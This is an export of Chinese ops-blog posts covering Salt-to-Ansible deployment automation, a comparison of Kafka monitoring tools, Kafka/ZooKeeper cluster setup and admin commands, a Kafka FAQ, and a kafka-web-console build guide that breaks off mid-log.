 交流学习：🐧 Linux shell_高级运维派: 459096184 圈子 (系统运维-应用运维-自动化运维-虚拟化技术研究欢迎加入)🐧 BigData-Exchange School : 521621407 圈子（大数据运维)（Hadoop开发人员)（大数据研究爱好者) 欢迎加入 相应Bidata有内部微信交流群互相学习，加入QQ群有链接。","link":"/2016/09/21/运维笔记/运维工程师的职责和前景/"},{"title":"运维自动化总结-记录帮助公司自动化架构演变过程","text":"运维自动化个人总结-记录自己自动化运维技术提升👍前言：个人2014年开始玩自动化的也是刚从业自动化运维岗位第一份工作，在一家上市公司做IDC+APM+CDN做云加速的应该很多玩cdn的都听说这家公司－mmtrix.com。 一开始开始深度学习的是SaltStack所以掌握的比较深更加熟练，其实也是一个好朋友推荐我看了一本书python入门到精通 里面有详细讲到salt安装和使用部署自动化各种操作，的确很方便。后面在测试环境我自己管理几十台服务器－学习使用Ansible去操作，因为salt跟ansible最大的区别，除了ansible快速上手和不需要复杂的安装，主要在内网方面比salt更稳定架构也比salt好。 在线上我们都是用salt去操作的，可是当时公司还没有运维开发的人员，所以后来salt在终端操作出了很多错： 12第一：人员操作失误一次，可能会导致所有的服务器都会受影响。第二：命令太多服务权限需要一一统一分配登陆终端操作。 那时候服务器有500多台那时候运维操作起来还是挺费力的。 经历：2016年初3月份去参加360的一次运维大会，王浩宇360的运维开发人员分享了一片文章：大规模集群上的多业务线环境部署. 讲的非常好，用的是Puppet去实现3000多台的服务器部署，指定部署安装包等等。非常方便。 这里也在Infoq上面有他的分享作品我这里粘贴出来了：大规模集群上的多业务线环境部署 个人现在运维自动化演变过程经验：我现在在一家上市公司旗下控股医疗大数据子公司负责运维部门，负责IT网络安全办公：主要做的应用运维和网络运维，兼大数据运维。 第一个版本公司整体服务架构： 2016年2月份脚本形式自动化发布：16年2月份这里的Tomcat自动化 发布我一开始使用shell脚本去实现自动化发布和回滚。 2016年4月份salt自动化远程控制脚本发布：16年4月份这里的tomcat服务增多，发现脚本发布手工操作太繁琐，而且出现问题几率大，效率不高。每次一次大版本改动发布会出现很多问题。 这里跟随服务模块增多，现在服务器90多台，统一salt自动化调用每台对应脚本发布回滚。 这里贴上我写的salt结合调用脚本命令，写在发布机器上面。这样就不需要进入机器每台执行对应发布脚本。 12345678910111213141516171819202122232425262728293031323334353637383940414243#!/bin/bash#author chengyangyang#2016年5月25日#this script is only for CentOS 6#check the OS#This script is used for the project release, which needs to be run by the root userplatform=`uname -i`if [ $platform != \"x86_64\" ];thenecho \"this script is only for 64bit Operating System !\"exit 1fiecho \"the platform is ok\"version=`cat /etc/redhat-release |awk '&#123;print substr($3,1,1)&#125;'`if [ $version != 6 ];thenecho \"this script is only for CentOS 6 !\"exit 1ficat &lt;&lt; EOF+----------------------------------------+| your system is CentOS 6 x86_64 || start Update release tomcat....... |+----------------------------------------+EOF#To determine whether the root permissionsif [ \"$UID\" != '0' ]then echo 'Permission denied, please switch the root tomcat.' exit 60fisalt \"node\" cmd.run \"curl -O http://10.47.100.90/ihaozhuo/war/haozhuo-tomcat.war\"[ $? -ne 0 ] &amp;&amp; exit 1salt \"node\" cmd.run \"md5sum haozhuo-tomcat.war\"[ $? -ne 0 ] &amp;&amp; exit 1salt \"node\" cmd.run \"mv haozhuo-tomcat.war java_war/\"[ $? -ne 0 ] &amp;&amp; exit 1salt \"node\" cmd.run \"sh /root/update/tomcat.sh\"[ $? -ne 0 ] &amp;&amp; exit 1salt 'node' cmd.run '/etc/init.d/tomcat-tomcat stop' env='&#123;\"LC_ALL\": \"zh_CN.UTF-8\"&#125;'salt 'node' cmd.run '/etc/init.d/tomcat-tomcat start' env='&#123;\"LC_ALL\": \"zh_CN.UTF-8\"&#125;'[ $? -ne 0 ] &amp;&amp; exit 1 2016年5月份去除了salt替换更新Ansible + Jenkins+Maven＋Nginx搞定自动发布，构建程序的持续集成平台Ansible vs SaltStack 对比？1. 自身运维SaltStack需要在Master和Minion主机启动守护进程，自身需要检测守护进程的运行状态，增加运维成本。Ansible和远端主机之间的通信是通过标准SSH进行，远程主机上只需要运行SSH进程就可以进行运维操作，SSH是机房主机中一般都安装和启动的进程，所以在Ansible进行运维的时候只需要关注Ansible主机的运行状态。Ansible对机房运维不会增加过多的运维成本。从工具本身的运维角度来说，Ansible要比SaltStack简单很多。 2. 使用语法Ansible的Playbook语法要比SaltStack的State语法具有更好的可读性。在使用的过程中发现Ansible在实现loop的更加的简洁，也可以使用相对路径。 同样Ansible的Notify模块和Handler模块实现的功能和SaltStack的watch和module.wait的模块实现功能也类似，也比SaltStack要简洁明了。 总之，Ansible的安全性能比SaltStack好，自身运维简单，使用语法可读性更强，虽然在响应速度方面不如SaltStack，但是在大部分应用场景下Ansible的响应速度能满足需求。因此，在金融行业的自动化运维系统，Ansible工具是最好的选择。 对应模块 account.yml 在Jenkins自动化写上变量对应.yml前缀名称。这里依然调用脚本去跑。 12345678910111213141516- hosts: tomcat-account_01 environment: LC_ALL: zh_CN.UTF-8 LANG : zh_CN.UTF-8 tasks: - name : cpfile-account copy : src=/root/.jenkins/workspace/yjk_master/haozhuo/haozhuo-account/target/haozhuo-account.war dest=/root/java_war/haozhuo-account.war - name : restart shell : /root/update/account.sh async : 0 - name : shutdown shell : /srv/tomcat/tomcat_account/bin/shutdown.sh async : 0 - name : start shell : chdir=/srv/tomcat/tomcat_account/bin nohup ./startup.sh &amp; async : 0 2016年6月份在ansible改进yml代码语法。去除了每台服务器新增发布脚本，这个过程太过于复杂，统一一台发布机处理即可。这里我贴出yml代码 Jenkins直接调用相应模块发布，自然会去执行对应yml代码。每台服务器不需要放发布回滚脚本。 123456789101112131415161718192021222324252627282930313233343536---- hosts: all environment: LC_ALL: zh_CN.UTF-8 LANG : zh_CN.UTF-8 vars:#jenkins-打包目录 TESTWAR: /root/java_war/haozhuo-family.war#生产环境中项目的tomcat所在的位置 OLDHOME: /srv/tomcat/tomcat_family/webapps/ROOT#生产环境中老版本项目所在webapps备份目录的位置 backupwebapps: /srv/tomcat/tomcat_family/warbackup#从jenkins-打包环境获取的新版本war包所在的位置 NEWWAR: /root/java_war/#生产环境中项目war包的名字 WARNAME: haozhuo-family.war#kill服务type路径 DOWNFILE: /srv/tomcat/tomcat_family tasks: - name: copy-war-file copy: src=&#123;&#123; TESTWAR &#125;&#125; dest=&#123;&#123; NEWWAR &#125;&#125; - name: mkdir-bakwar-file file: path=&#123;&#123; backupwebapps &#125;&#125; state=directory owner=tomcat group=tomcat mode=755 - name: bakwar-file shell: \"cp -r &#123;&#123; OLDHOME &#125;&#125; &#123;&#123; backupwebapps &#125;&#125;\" - name: unzip war. unarchive: src=&#123;&#123; NEWWAR &#125;&#125;/&#123;&#123; WARNAME &#125;&#125; dest=&#123;&#123; OLDHOME &#125;&#125; - name: stop-tomcat-service shell: \"ps -ef |grep &#123;&#123; DOWNFILE &#125;&#125; |grep -v grep |awk '&#123;print $2&#125;' |xargs kill -9\" ignore_errors: yes async: 0 - name: start-tomcat-service-nohup shell: chdir=&#123;&#123; DOWNFILE &#125;&#125;/bin nohup ./startup.sh &amp; 3. 总结在金融领域中，安全是最重要的考虑因素，在众多自动化运维工具种，Ansible的安全性能最好，是目前最适合金融领域的自动化运维工具。本文通过将Ansible微服务化，集成到自动化运维平台中，实现自动化运维平台高并发执行运维操作场景和实时收集执行结果。 2016年7月份Jenkins上面实现持续集成这里Jenkins打通gitlab自动发布，审计代码。 这里结合openVPN+谷歌二次动态认证效果给予开发他们开放环境。架构图 ： 2016年9月份公司架构演变从传统架构更换dubbo架构。公司应用服务架构图这里贴出来：Dubbo架构设计详解 系统架构图这里我后期在更新贴出来。 2017年3月份 公司服务器150台服务自动化发布。后面运维开发开发了一套基于salt自动化一套web版的管理平台。对我们后面的做部署初始化的确减轻了很多。现在开始公司用的是ansible基python开发出来一套自动化部署的。发布部署测试一体系：刚开发出来的截了一张图： 个人总结：系统标准化：要想自动化，首先第一就是标准化。比如软件的安装位置、版本、脚本，注册到init.d下面，这些应该是标准的，所有服务器都统一的。或者说你使用salt就是为了达到这样的标准化做自动化运维要经历的标准化–&gt;&gt;自动化—-&gt;&gt;服务化—-&gt;&gt;数据化。 个人意见： 只有标准了，才能自动，至少你相同的业务都应该是一样的。 自动化，这个自动化讲的是工具，所有的操作是工具再做，不是人。也有小公司说我们半自动，的确是有的，就写写脚本然后靠工具去管理。 服务化，你平台搞的很牛逼了，直接给业务提供接口。DNS、负载均衡、分布式存储、你都封装好了，上层不需要关心，你相当于为上层服务提供服务。各种API都写好了。 数据化，或者说可视化，运维平台做的很牛逼，直接对业务负责，以业务为导向，今天订单量减少了，通过你的运维平台，直接定位问题，不需要各种查找，因为订单量的减少，肯定有相关的监控指标发生变化。 那么在工具自动化建设的开始，你需要有一个理论支持，比如ITIL。不能瞎搞。没有流程的自动化运维就是耍流氓如果上线没有走上线流程，动不动，开发自己登录服务器执行了git pull。那还自动化什么呢。 我个人的概念就是生产就是咱们运维的地盘。谁都不能动。开发想动，你可以提供接口，或者提供平台让开发点点鼠标就可以了。 题外话：说个很蛋疼的事情，之前刚来这边负责美年大新的运维团队，技术团队开发人员都可以随便要权限，然后解决问题运维不用参与都是开发去操作。所以后来把公司运维整改：运维之间权限这些都是避免了。统一管理，统一分配，不同部门，不同岗位，不同权限。 这里我写过一篇文章：中小公司员工统一用户认证方案 这个是自动化里面最常见的部署自动化，对于ITIL的流程就是发布与部署管理。构建---打包---测试---发布都需要是自动的；所以这块需要测试的支持。需要有自动化测试。没有就卡到测试了。最简单的就是发布流程和开发流程分开。 自动化运维减轻了很多的事情，也让更多的运维小伙伴可以研究更多的知识。这篇文章也是自己对这两年多运维的这一方面的自动化运维的总结。","link":"/2017/03/14/运维笔记/运维自动化总结-记录帮助公司自动化架构演变过程/"},{"title":"Bigdata-Kafka三款监控工具比较","text":"在之前的博客中，介绍了Kafka Web Console这个监控工具，在生产环境中使用，运行一段时间后，发现该工具会和Kafka生产者、消费者、ZooKeeper建立大量连接，从而导致网络阻塞。并且这个Bug也在其他使用者中出现过，看来使用开源工具要慎重！该Bug暂未得到修复，不得已，只能研究下其他同类的Kafka监控软件。 通过研究，发现主流的三种kafka监控程序分别为： 1、Kafka Web Conslole 2、Kafka Manager 3、KafkaOffsetMonitor 现在依次介绍以上三种工具： 1、Kafka Web Conslole使用Kafka Web Console，可以监控： Brokers列表 Kafka 集群中 Topic列表，及对应的Partition、LogSiz e等信息 点击Topic，可以浏览对应的Consumer Groups、Offset、Lag等信息 生产和消费流量图、消息预览… 程序运行后，会定时去读取kafka集群分区的日志长度，读取完毕后，连接没有正常释放，一段时间后产生大量的socket连接，导致网络堵塞。 2、Kafka Manager雅虎开源的Kafka集群管理工具: 管理几个不同的集群 监控集群的状态(topics, brokers, 副本分布, 分区分布) 产生分区分配(Generate partition assignments)基于集群的当前状态 重新分配分区 3、KafkaOffsetMonitor KafkaOffsetMonitor可以实时监控： Kafka集群状态 Topic、Consumer Group列表 图形化展示topic和consumer之间的关系 图形化展示consumer的Offset、Lag等信息 总结通过使用，个人总结以上三种监控程序的优缺点： Kafka Web Console：监控功能较为全面，可以预览消息，监控Offset、Lag等信息，但存在bug，不建议在生产环境中使用。 Kafka Manager：偏向Kafka集群管理，若操作不当，容易导致集群出现故障。对Kafka实时生产和消费消息是通过JMX实现的。没有记录Offset、Lag等信息。 KafkaOffsetMonitor：程序一个jar包的形式运行，部署较为方便。只有监控功能，使用起来也较为安全。 若只需要监控功能，推荐使用KafkaOffsetMonito，若偏重Kafka集群管理，推荐使用Kafka Manager。 因为都是开源程序，稳定性欠缺。故需先了解清楚目前已存在哪些Bug，多测试一下，避免出现类似于Kafka Web Console的问题。 交流学习：🐧 Linux shell_高级运维派: 459096184 圈子 (系统运维-应用运维-自动化运维-虚拟化技术研究欢迎加入)🐧 BigData-Exchange School : 521621407 圈子（大数据运维)（Hadoop开发人员)（大数据研究爱好者) 欢迎加入 相应Bidata有内部微信交流群互相学习，加入QQ群有链接。","link":"/2017/04/29/Bigdata-hadoop/Kafka/Bigdata-Kafka三款监控工具比较/"},{"title":"Bigdata-Kafka集群快速搭建与增删改查命令讲解","text":"Bigdata-Kafka集群快速搭建与增删改查命令讲解 kafka集群和zookeeper集群规范12345678910111213141516171819kafka集群和zookeeper集群规范kafka版本：kafka_2.10-0.8.2.1zookeeper版本：zookeeper-3.4.5启动用户：jollybikafka安装目录：/data/tools/kafka新建消息目录：/data/tools/kafka_2.10-0.8.2.1/kafka-logs启动用户：jollybizookeeper安装目录：/data/tools/zookeeper新建日志目录：/data/tools/zookeeper-3.4.5/tmp/logs统一配置hosts10.155.90.153 kafka1.jollychic.com kafka110.155.90.155 kafka2.jollychic.com kafka210.155.90.138 kafka3.jollychic.com kafka3 本文使用了3台机器部署Kafka集群，IP和主机名对应关系如下： 12310.155.90.153 kafka1.jollychic.com kafka110.155.90.155 kafka2.jollychic.com kafka210.155.90.138 kafka3.jollychic.com kafka3 Step1: 配置/etc/hosts （3台一致）1234127.0.0.1 localhost.localdomain localhost10.155.90.153 kafka1.jollychic.com kafka110.155.90.155 kafka2.jollychic.com kafka210.155.90.138 kafka3.jollychic.com kafka3 Step2: 环境KafKa集群环境123下载地址：http://mirrors.hust.edu.cn/apache/kafka/0.9.0.0/kafka_2.10-0.8.2.1.tgz[jollybi@kafka1 ]# tar -xvf kafka_2.10-0.8.2.1.tgz -C /data/tools/cd /data/tools/kafka_2.10-0.8.2.1/config 设置data目录，最好不要用默认的/tmp/kafka-logs1mkdir -p /data/tools/kafka_2.10-0.8.2.1/kafka-logs/ 修改kafka配置文件 1234567891011121314151617181920[root@kafka_01 config]# vim server.properties 设置brokerid（从0开始，3个节点分别设为1,2,3，不能重复）在这里id=0跟zookeeper id设置一样就行。 集群机器：按顺序写1broker.id=1 auto.leader.rebalance.enable=true #修改本地IP地址：listeners=PLAINTEXT://10.46.72.172:9092port=9292 //设置访问端口host.name=10.155.90.153 kafka本机IPlog.dirs=/data/tools/kafka_2.10-0.8.2.1/kafka-logs#设置注册地址（重要，默认会把本机的hostanme注册到zk中，客户端连接时需要解析该hostanme，所以这里直接注册本机的IP地址，避免hostname解析失败，报错java.nio.channels.UnresolvedAddressException或java.io.IOException: Can not resolve address）#设置zookeeper地址#zookeeper.connect=10.46.72.172:2181,10.47.88.103:2181,10.47.102.137:2181zookeeper.connect=kafka1.jollychic.com:2281,kafka2.jollychic.com:2281,kafka3.jollychic.com:2281//这里我设置hosts代替IP 配置zookeeper地址 1234567vim zookeeper.properties dataDir=/data/tools/zookeeper-3.4.5/tmp# the port at which the clients will connectclientPort=2281# disable the per-ip limit on the number of connections since this is a non-production configmaxClientCnxns=0~ 配置kafka访问地址 1234567891011121314vim producer.properties metadata.broker.list=169.44.62.139:9292,169.44.59.138:9292,169.44.62.137:9292 # name of the partitioner class for partitioning events; default partition spreads data randomly#partitioner.class=# specifies whether the messages are sent asynchronously (async) or synchronously (sync)producer.type=sync# specify the compression codec for all data generated: none, gzip, snappy, lz4.# the old config values work as well: 0, 1, 2, 3 for none, gzip, snappy, lz4, respectivelycompression.codec=none# message encoderserializer.class=kafka.serializer.DefaultEncoder Step3: 集群机器快速拷贝配置:远程复制分发安装文件最好是把文件打包scp过去接下来将上面的安装文件拷贝到集群中的其他机器上对应的目录 12scp -P58958 -r kafka_2.10-0.8.2.1 jollybi@169.44.62.137:/home/jollybi/tools/. scp -P58958 -r kafka_2.10-0.8.2.1 jollybi@169.44.62.138:/home/jollybi/tools/. 统一修改分别其他两台kafka server.properties 12345broker.id=2 host.name=169.44.62.137 kafka2本机IPbroker.id=3 host.name=169.44.62.138 kafka3本机IP Step4:启动 kafka集群1234567./kafka-server-start.sh -daemon ../config/server.properties[jollybi@kafka1 config]$ jps3443 QuorumPeerMain16280 Jps3628 KafkaStep5: Kafka常用命令(普及) Step5:测试集群基本命令12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697### 默认创建kafka Topic: 1个副本备份 1个分区消费./kafka_2.10-0.8.2.1/bin/kafka-topics.sh --create --zookeeper kafka1.jollychic.com:2281,kafka2.jollychic.com:2281,kafka3.jollychic.com:2281 --replication-factor 1 --partitions 1 --topic mongotail_lz4./kafka_2.10-0.8.2.1/bin/kafka-topics.sh --create --zookeeper kafka1.jollychic.com:2281,kafka2.jollychic.com:2281,kafka3.jollychic.com:2281 --replication-factor 1 --partitions 1 --topic mongotail_lz4_imp### 大数据这边需要12个分区这里我删除Topic重新创建Topic：### 删除kafka Topic:第一步：删除kafka topic./kafka_2.10-0.8.2.1/bin/kafka-topics.sh --zookeeper kafka1.jollychic.com:2281,kafka2.jollychic.com:2281,kafka3.jollychic.com:2281 --delete --topic mongotail_lz4 ./kafka_2.10-0.8.2.1/bin/kafka-topics.sh --zookeeper kafka1.jollychic.com:2281,kafka2.jollychic.com:2281,kafka3.jollychic.com:2281 --delete --topic mongotail_lz4_imp### 这是由于删除topic没删干净会报错：org.apache.kafka.common.errors.UnknownTopicOrPartitionException: This server does not host this topic-partition.### 删除线程执行删除操作的真正逻辑是：1. 它首先会给当前所有broker发送更新元数据信息的请求，告诉这些broker说这个topic要删除了，你们可以把它的信息从缓存中删掉了2. 开始删除这个topic的所有分区2.1 给所有broker发请求，告诉它们这些分区要被删除。broker收到后就不再接受任何在这些分区上的客户端请求了2.2 把每个分区下的所有副本都置于OfflineReplica状态，这样ISR就不断缩小，当leader副本最后也被置于OfflineReplica状态时leader信息将被更新为-12.3 将所有副本置于ReplicaDeletionStarted状态2.4 副本状态机捕获状态变更，然后发起StopReplicaRequest给broker，broker接到请求后停止所有fetcher线程、移除缓存，然后删除底层log文件2.5 关闭所有空闲的Fetcher线程 ### 第二步：删除zookeeper相关的路径：[jollybi@kafka1 zookeeper-3.4.5]$ ./bin/zkCli.sh -server 127.0.0.1:2281 [zk: 127.0.0.1:2281(CONNECTED) 1] rmr /brokers/topics/mongotail_lz4[zk: 127.0.0.1:2281(CONNECTED) 0] rmr /consumers/group_ml_general/offsets/mongotail_lz4[zk: 127.0.0.1:2281(CONNECTED) 1] rmr /consumers/group_ml_general/owners/mongotail_lz4[zk: 127.0.0.1:2281(CONNECTED) 3] rmr /config/topics/mongotail_lz4[zk: 127.0.0.1:2281(CONNECTED) 4] rmr /admin/delete_topics/mongotail_lz4### 删除topic上面消费组 删除 ZooKeeper 下面的 /consumers/[group_id] 路径就可以了。ZooKeeper 原生API只支持删除空的路径，所以建议你使用 curator framework 进行这个删除操作，ZkPaths.deleteChildren 会递归式地删除整个路径（包括子路径）。[zk: 127.0.0.1:2281(CONNECTED) 0] rmr /consumers/kafka-node1-imp-group[zk: 127.0.0.1:2281(CONNECTED) 1] rmr /consumers/kafka-node1-group[zk: 127.0.0.1:2281(CONNECTED) 2] rmr /consumers/console-consumer-59053[zk: 127.0.0.1:2281(CONNECTED) 3] rmr /consumers/1、设置配置文件允许删除delete.topic.enable=true 配置添加到 config/server.properties2、执行删除命令./bin/kafka-topics.sh --zookeeper localhost:2181 --delete --topic test-topic在zookeeper中确认： 删除zookeeper下/brokers/topics/test-topic节点 删除zookeeper下/config/topics/test-topic节点 删除zookeeper下/admin/delete_topics/test-topic节点 consumer 的话 删除groupid ### 重启kafka集群### 大数据kafka建topic，不能建一个分区，那样吞吐量上不去，不够用，我们以前建了12个分区的### 创建新 kafka Topic: 3个副本，12个分区 ./kafka_2.10-0.8.2.1/bin/kafka-topics.sh --create --zookeeper kafka1.jollychic.com:2281,kafka2.jollychic.com:2281,kafka3.jollychic.com:2281 --replication-factor 3 --partitions 12 --topic mongotail_lz4./kafka_2.10-0.8.2.1/bin/kafka-topics.sh --create --zookeeper kafka1.jollychic.com:2281,kafka2.jollychic.com:2281,kafka3.jollychic.com:2281 --replication-factor 3 --partitions 12 --topic mongotail_lz4_imp### 查看创建的Topic:./kafka_2.10-0.8.2.1/bin/kafka-topics.sh --describe --zookeeper kafka1.jollychic.com:2281,kafka2.jollychic.com:2281,kafka3.jollychic.com:2281 --topic mongotail_lz4./kafka_2.10-0.8.2.1/bin/kafka-topics.sh --describe --zookeeper kafka1.jollychic.com:2281,kafka2.jollychic.com:2281,kafka3.jollychic.com:2281 --topic mongotail_lz4_imp### 查看集群情况：./kafka_2.10-0.8.2.1/bin/kafka-topics.sh --describe --zookeeper kafka1.jollychic.com:2281,kafka2.jollychic.com:2281,kafka3.jollychic.com:2281 --topic mongotail_lz4### 模拟生产者（producer）kafka生产客户端生产数据命令：./bin/kafka-console-producer.sh --broker-list 75.126.39.124:9292,75.126.5.162:9292,75.126.5.178:9292 --topic mongotail_lz4_imp ......my test message 1my test message 2^C### 模拟消费者（consumer）kafka消费客户端数据命令 现在我们来看看消息： ./bin/kafka-console-consumer.sh --zookeeper 75.126.39.124:2281,75.126.5.162:2281,75.126.5.178:2281 --from-beginning** --topic mongotail_lz4_imp......my test message 1my test message 2^C Kafka常用命令以下是kafka常用命令行总结： 123456789101112131415161718192021222324252627282930313233343536371、 list topic 显示所有topic./bin/kafka-topics.sh --list --zookeeper kafka1.jollychic.com:2281,kafka2.jollychic.com:2281,kafka3.jollychic.com:22812、 查看topic的详细信息 ./bin/kafka-topics.sh --zookeeper 75.126.39.124:2281,75.126.5.162:2281,75.126.5.178:2281 -describe -topic mongotail_lz4_imp3、为topic增加partition分区 参数：--alter --partitions./bin/kafka-topics.sh --alter --zookeeper 75.126.39.124:2281,75.126.5.162:2281,75.126.5.178:2281 --partitions 20 --topic mongotail_lz4_imp4、kafka生产者客户端命令 ./bin/kafka-console-producer.sh --broker-list 75.126.39.124:9292,75.126.5.162:9292,75.126.5.178:9292 --topic mongotail_lz4_imp 5、kafka消费者客户端命令 ./bin/kafka-console-consumer.sh --zookeeper 75.126.39.124:2281,75.126.5.162:2281,75.126.5.178:2281 --from-beginning --topic 6、kafka服务启动 ./kafka-server-start.sh -daemon ../config/server.properties 7、下线broker ./kafka-run-class.sh kafka.admin.ShutdownBroker --zookeeper 127.0.0.1:2181 --broker #brokerId# --num.retries 3 --retry.interval.ms 60 shutdown broker 8、删除topic ./kafka-run-class.sh kafka.admin.DeleteTopicCommand --topic testKJ1 --zookeeper 127.0.0.1:2181 ./kafka-topics.sh --zookeeper localhost:2181 --delete --topic testKJ1 9、查看consumer组内消费的offset ./kafka-run-class.sh kafka.tools.ConsumerOffsetChecker --zookeeper localhost:2181 --group test --topic testKJ110、查看某个消费组的消费详情（支持0.9版本+）bin/kafka-consumer-groups.sh --new-consumer --bootstrap-server localhost:9092 --describe --group test-consumer-group11、新消费者（支持0.9版本+）bin/kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic test --new-consumer --from-beginning --consumer.config config/consumer.properties Step6:Kafka存储每个replica一个目录 1234[jollybi@kafka1 kafka_2.10-0.8.2.0]# cd /data/tools/kafka_2.10-0.8.2.0/kafka-logs/[root@master kafka-logs]# ls__consumer_offsets-0 __consumer_offsets-20 __consumer_offsets-32 __consumer_offsets-44 my-replicatedtopic1-0__consumer_offsets-1 __consumer_offsets-21 __consumer_offsets-33 __consumer_offsets-45 my-replicated-topic1-1 二级结构 123[jollybi@kafka1 kafka-logs]# cd my-replicated-topic1-0/[jollybi@kafka1 my-replicated-topic1-0]# ls00000000000000000000.index 00000000000000000000.log 交流学习：🐧 Linux shell_高级运维派: 459096184 圈子 (系统运维-应用运维-自动化运维-虚拟化技术研究欢迎加入)🐧 BigData-Exchange School : 521621407 圈子（大数据运维)（Hadoop开发人员)（大数据研究爱好者) 欢迎加入 相应Bidata有内部微信交流群互相学习，加入QQ群有链接。","link":"/2017/03/28/Bigdata-hadoop/Kafka/Bigdata-Kafka集群快速搭建与增删改查命令讲解/"},{"title":"KafKa不懂就学就问就解答笔记","text":"1. 部署生产环境，打算部署三个broker实例，但zookeeper部署一个可以吗?1答案：可以是可以，但为了容错还是部署zookeeper集群比较好。broker和zookeeper的对应比例倒是没什么，都是独立集群。 2. kafka集群为什么需要zookeeper来配合？1答案：zookeeper 是作为性能协调工具的角色存在。存储着你Kafka服务的一些些元数据（partitions、offset等等）。zookeeper集群的作用在于保证Zookeeper服务的高可用。因此你可以根据你的需要来选择是否构建zookeeper集群。 3. 查看kafka topic 消费记录报错WARN Session 0x0 for server null, unexpected error, closing socket connection and attempting reconnect (org.apache.zookeeper.ClientCnxn)java.net.ConnectException: Connection timed out 123问题：1.是kafka连不上zookeeper了。请检查 zk 集群是否正常能Telnet，kafka集群是否正常。2.检查server.properties 中zookeeper.connect是否配置正确，如果都没有问题，重新启动服务。 4. kafka 支持压缩传输吗？5. Kafka 如何在开启数据压缩的情况下, consumer维护自己的offset?123456789101112131415161718192021问题：kafka这边数据传输消费跨aws机房较慢。会有网络瓶颈,我们kafka在国外的一dalasi机房，消费端在dalasi。官网解答：Offset management on the consumerThe data received by a consumer for a topic might contain both compressed as well as uncompressed messages. The consumer iterator transparently decompresses compressed data and only returns an uncompressed message. The offset maintenance in the consumer gets a little tricky. In the zookeeper consumer, the consumed offset is updated each time a message is returned. This consumed offset should be a valid fetch offset for correct failure recovery. Since data is stored in compressed format on the broker, valid fetch offsets are the compressed message boundaries. Hence, for compressed data, the consumed offset will be advanced one compressed message at a time. This has the side effect of possible duplicates in the event of a consumer failure. For uncompressed data, consumed offset will be advanced one message at a time.这段话不是很理解: producer将100条message压缩成1条发给broker后, broker是如何存储的，并且consumer是如何取出这压缩后的数据, 并维护offset的?### 消息压缩（message compression）考虑到网络带宽的瓶颈，Kafka提供了消息组压缩特性。Kafka通过递归消息集来支持高效压缩。高效压缩需要多个消息同时压缩，而不是对每个消息单独压缩。一批消息压缩在一起发送给broker。压缩消息集降低了网络的负载，但是解压缩也带来了一些额外的开销。消息集的解压缩是由broker处理消息offset时完成的。每个消息可通过一个不可比较的、递增的逻辑offset访问，这个逻辑offset在每个分区内是唯一的。接收到压缩数据后，lead broker将消息集解压缩，为每个消息分配offset。offset分配完成后，leader再次将消息集压缩并写入磁盘。在Kafka中，数据的压缩由producer完成，可使用GZIP或Snappy压缩协议。同时需要在producer端配置相关的参数：compression.codec：指定压缩格式，默认为none，可选的值还有gzip和snappy。compressed.topics：设置对指定的topic开启压缩，默认为null。当compression.codec不为none时，对指定的topic开启压缩；如果compressed.topics为null则对所有topic开启压缩。消息集ByteBufferMessageSet可能既包含压缩数据也包含非压缩数据，为了区分开来，消息头中添加了压缩属性字节。在该字节中，最低位的两位表示压缩格式，如果都是0表示非压缩数据。 Communicative learning:🐧 Linux shell_ senior operation and maintenance faction: QQ group 459096184 circle (system operation and maintenance - application operation and maintenance - automation operation and maintenance - virtualization technology research, welcome to join)🐧 BigData-Exchange School:QQ group 521621407 circles (big data Yun Wei) (Hadoop developer) (big data research enthusiasts) welcome to join Bidata have internal WeChat exchange group, learn from each other, join QQ group has links.","link":"/2017/09/11/Bigdata-hadoop/Kafka/KafKa不懂就学就问就解答笔记/"},{"title":"Bigdata-开源的Kafka集群管理器(kafka-web-console)","text":"前言源码的地址在:kafka-web-console Kafka Web Console也是用Scala语言编写的Java web程序用于监控Apache Kafka。这个系统的功能和KafkaOffsetMonitor很类似，但是我们从源码角度来看，这款系统实现比KafkaOffsetMonitor要复杂很多，而且编译配置比KafkaOffsetMonitor较麻烦。 要想运行这套系统我们需要的先行条件为： 123Play Framework 2.2.xApache Kafka 0.8.xZookeeper 3.3.3 or 3.3.4 入门同样，我们从https://github.com/claudemamo/kafka-web-console上面将源码下载下来，然后用sbt进行编译，在编译前我们需要做如下的修改： Kafka Web控制台需要一个关系数据库。默认情况下，服务器连接到嵌入式H2数据库，不需要数据库安装或配置。请咨询Play！的文档以指定控制台的数据库。支持以下数据库： 1git clone https://github.com/claudemamo/kafka-web-console.git H2（默认） PostgreSql Oracle DB2 MySQL Apache Derby Microsoft SQL Server 为了方便，我们可以使用Mysql数据库，只要做如下修改即可，找到 conf/application.conf文件，并修改如下 123456789101112将这个db.default.driver=org.h2.Driverdb.default.url=\"jdbc:h2:file:play\"# db.default.user=sa# db.default.password=\"\" 修改成db.default.driver=com.mysql.jdbc.Driverdb.default.url=\"jdbc:mysql://localhost:3306/kafkamonitor\"db.default.user=iteblogdb.default.pass=wyp 我们还需要修改build.sbt，加入对Mysql的依赖: 1\"mysql\" % \"mysql-connector-java\" % \"5.1.31\" 2、执行conf/evolutions/default/bak目录下面的1.sql、2.sql和3.sql三个文件。需要注意的是，这三个sql文件不能直接运行，有语法错误，需要做一些修改。上面的注意事项弄完之后，我们就可以编译下载过来的源码： 1# sbt package 编译的过程比较慢，有些依赖包下载速度非常地慢，请耐心等待。 在编译的过程中，可能会出现有些依赖包无法下载，如下错误： 123456789101112131415161718192021222324252627282930313233[warn] module not found: com.typesafe.play#sbt-plugin;2.2.1[warn] ==== typesafe-ivy-releases: tried[warn] http://repo.typesafe.com/typesafe/ivy-releases/com.typesafe.play/sbt-plugin/scala_2.9.2/sbt_0.12/2.2.1/ivys/ivy.xml[warn] ==== sbt-plugin-releases: tried[warn] http://scalasbt.artifactoryonline.com/scalasbt/sbt-plugin-releases/com.typesafe.play/sbt-plugin/scala_2.9.2/sbt_0.12/2.2.1/ivys/ivy.xml[warn] ==== local: tried[warn] /home/iteblog/.ivy2/local/com.typesafe.play/sbt-plugin/scala_2.9.2/sbt_0.12/2.2.1/ivys/ivy.xml[warn] ==== Typesafe repository: tried[warn] http://repo.typesafe.com/typesafe/releases/com/typesafe/play/sbt-plugin_2.9.2_0.12/2.2.1/sbt-plugin-2.2.1.pom[warn] ==== public: tried[warn] http://repo1.maven.org/maven2/com/typesafe/play/sbt-plugin_2.9.2_0.12/2.2.1/sbt-plugin-2.2.1.pom[warn] :::::::::::::::::::::::::::::::::::::::::::::: ==== local: tried 